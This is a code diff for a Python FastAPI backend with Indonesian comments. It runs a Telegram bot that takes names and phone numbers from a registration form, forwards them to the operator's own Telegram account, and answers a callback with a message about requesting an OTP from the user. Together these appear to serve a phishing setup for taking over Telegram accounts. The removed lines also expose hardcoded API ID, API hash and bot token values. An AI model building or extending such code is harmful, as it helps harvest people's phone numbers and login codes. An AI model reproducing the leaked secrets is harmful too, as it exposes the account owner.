@@ -13,36 +13,39 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# Ambil Variabel dari Railway (Tab Variables)
-API_ID = os.getenv('API_ID', '33714700')
-API_HASH = os.getenv('API_HASH', '9319b6d061a62e30b6a247cdff6aaf91')
-BOT_TOKEN = os.getenv('BOT_TOKEN', '8244385359:AAG7b2VCv_o5_miHQ7LXWn3-SbyqFPZLHCY')
+# Ambil Variabel dari Railway (Pastikan sudah diisi di tab Variables)
+API_ID = os.getenv('API_ID')
+API_HASH = os.getenv('API_HASH')
+BOT_TOKEN = os.getenv('BOT_TOKEN')
 
-# Inisialisasi Bot Client
+# Inisialisasi Bot Client (Gunakan int untuk API_ID agar tidak error)
 bot_client = TelegramClient('bot_session', int(API_ID), API_HASH)
 
 @app.on_event("startup")
 async def startup_event():
-    # Menjalankan bot saat server mulai
+    # Menjalankan bot saat server mulai (Ini yang bikin garis merah hilang)
     await bot_client.start(bot_token=BOT_TOKEN)
-    print("Bot is running...")
+    print("Backend Berhasil Online dan Bot Berjalan!")
 
 @app.post("/register")
 async def register(request: Request):
-    data = await request.json()
-    nama = data.get("name")
-    phone = data.get("phone")
-    
-    # Kirim notifikasi ke kamu saat ada yang isi form
-    await bot_client.send_message('me', f"Ada pendaftar baru!\nNama: {nama}\nNomor: {phone}")
-    
-    return {"status": "success", "message": "Data berhasil dikirim ke bot"}
+    try:
+        data = await request.json()
+        nama = data.get("name")
+        phone = data.get("phone")
+        
+        # Kirim notifikasi ke Telegram kamu
+        await bot_client.send_message('me', f"Ada pendaftar baru!\nNama: {nama}\nNomor: {phone}")
+        
+        return {"status": "success", "message": "Data terkirim"}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
 
 @app.get("/")
 async def root():
-    return {"message": "Backend is Online!"}
+    return {"message": "Server Hijau dan Aktif!"}
 
-# Handler untuk tombol atau callback (Perbaikan dari Screenshot 214)
+# Handler untuk interaksi bot jika diperlukan
 @bot_client.on(events.CallbackQuery(data=b'req'))
 async def handler(event):
-    await event.answer("Meminta OTP Baru ke User...", alert=False)
+    await event.answer("Meminta OTP...", alert=False)
